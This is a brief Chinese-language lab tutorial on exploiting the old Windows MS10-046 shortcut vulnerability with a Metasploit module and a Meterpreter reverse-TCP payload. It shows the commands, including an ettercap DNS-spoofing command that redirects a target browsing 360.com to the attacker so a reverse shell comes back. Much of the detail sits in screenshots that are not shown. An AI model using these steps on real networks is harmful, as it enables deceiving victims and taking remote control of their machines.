# Metasploit ms10_046_shortcut_icon_dllloader 利用

> 使用该模块需要将apache关闭，否则会出现端口冲突。有一定几率会不成功

1. `search shortcut`获取可利用的漏洞

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-19_10-58-40.png"/>

   这里我们使用`exploit/windows/browser/ms10_046_shortcut_icon_dllloader`

2. 设置参数，使用默认`windows/meterpreter/reverse_tcp`做为攻击载荷

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-19_11-00-33.png"/>

3. 利用漏洞，根据提示。我们需要让目标机访问192.168.80.200:80

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-19_11-03-08.png"/>

4. 为了目标机更容易上当，我们可以使用ettercap的dns_spoof插件，具体参考：https://www.cnblogs.com/kikochz/p/13688535.html。`ettercap -Tq -P dns_spoof /// ///`默认使用第一个接口。当目标机访问我们预先设置好的360.com时就会跳转到攻击机，并反弹shell

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-19_11-11-42.png"/>

5. 我们其实可以发现该漏洞时鉴于windows的共享资源漏洞

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-19_11-13-20.png"/>

6. 我们可以通过`sessions `查看反弹会的shell会话，通过`sessions -i num`来重新连接

<img src="..\..\..\imgs\_Kali\metasploit\Snipaste_2020-09-19_11-19-28.png"/>
